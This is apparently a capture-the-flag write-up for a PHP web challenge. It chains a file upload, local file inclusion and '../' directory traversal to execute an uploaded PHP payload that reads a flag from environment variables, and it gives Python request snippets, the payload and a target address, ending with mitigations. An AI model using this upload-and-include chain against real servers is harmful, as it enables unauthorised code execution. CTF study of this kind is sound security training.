# PA_Incloud2RCE

## Challenge Overview
This is a web challenge involving file upload and remote code execution (RCE) vulnerabilities. The challenge name "Incloud2RCE" suggests it's about exploiting cloud-based file operations to achieve remote code execution.

## Vulnerability Analysis
Based on the exploit script, the application has the following vulnerabilities:

1. **Arbitrary File Upload**: The application accepts user input via a `content` parameter and writes it to a file using `file_put_contents()`
2. **Local File Inclusion (LFI)**: The application includes files based on user input via a `file` parameter
3. **Directory Traversal**: The application doesn't properly sanitize file paths, allowing directory traversal with `../`

## Exploitation Steps

### Step 1: Upload Malicious PHP Payload
```python
payload = '<?=getenv("flag");?>'
params_upload = {"content": payload}
resp = requests.get(BASE_URL, params=params_upload)
```

The exploit uploads a PHP payload that calls `getenv("flag")` to read the flag from environment variables. The server responds with the path where the file was saved (typically in `/tmp/` directory).

### Step 2: Extract File Path
```python
match = re.search(r"/tmp/[a-f0-9]+\.txt", resp.text)
file_path = match.group(0)
```

The script extracts the file path from the server response using regex pattern matching.

### Step 3: Execute Uploaded File via LFI
```python
params_exec = {"file": "../../../.." + file_path, "flag": "flag"}
resp = requests.get(BASE_URL, params=params_exec)
```

The exploit uses directory traversal (`../../../..`) to include the uploaded file from `/tmp/` directory. The file inclusion causes the PHP code to execute, reading the flag from environment variables.

## Technical Details

- **Target**: `124.16.75.117:51001`
- **Endpoint**: `/index.php`
- **Method**: GET requests with parameters
- **Payload**: PHP short tag `<?=getenv("flag");?>`
- **Directory Traversal**: `../../../..` to escape current directory
- **File Pattern**: `/tmp/[hex].txt` (randomized filename)

## Key Insights

1. The application saves uploaded content to predictable file paths in `/tmp/`
2. The file inclusion functionality doesn't properly validate file paths
3. Directory traversal allows access to files outside the web root
4. The flag is stored as an environment variable accessible via `getenv()`

## Flag Retrieval
When the uploaded PHP file is included and executed, it calls `getenv("flag")` which returns the flag value from the server's environment variables.

## Mitigation
To prevent this vulnerability:
1. Validate and sanitize all user inputs
2. Implement proper file upload restrictions
3. Use whitelist-based file inclusion instead of user-controlled paths
4. Disable dangerous PHP functions in web-accessible directories
5. Store sensitive data securely, not in environment variables
